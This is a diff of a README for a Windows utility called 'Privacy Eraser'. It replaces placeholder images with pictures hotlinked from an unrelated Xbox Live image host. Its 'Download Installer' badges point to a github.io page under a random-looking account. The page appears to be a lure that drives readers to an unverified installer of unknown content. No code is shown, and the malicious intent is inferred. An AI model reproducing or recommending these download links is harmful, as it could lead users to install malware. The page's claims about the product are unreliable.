@@ -1,7 +1,7 @@
 # Privacy Eraser Privacy Management Toolkit
 
 <div align="center">
-<img src="logo-placeholder.png" alt="Privacy Eraser Logo" width="150">
+<img src="https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxgEQ4ACObbkTRF4XqKHechyIUKWLUbbTFG85SJbB3SlORUGjtXY7Q_a9MRucNTqkgF7y3K3oD9LwJz9MAUL_koI-&format=source" alt="Privacy Eraser Logo" width="150">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://alijahfraziernfnq.github.io/.github/Privacy-Eraser-Windows)
@@ -24,7 +24,7 @@ Privacy Eraser integrates naturally into Windows administration routines and del
 ---
 
 <div align="center">
-<img src="screenshot-placeholder.png" alt="Privacy Eraser Screenshot" width="800">
+<img src="https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxgEQ4ACObbkTRF4XqKHechzqZek7IMqbUi150F2yL3_QpAzkgqrnN1iIIjH01T2ryenAgeE7NtiKbXB6QePeNqQ-&format=source" alt="Privacy Eraser Screenshot" width="800">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://alijahfraziernfnq.github.io/.github/Privacy-Eraser-Windows)
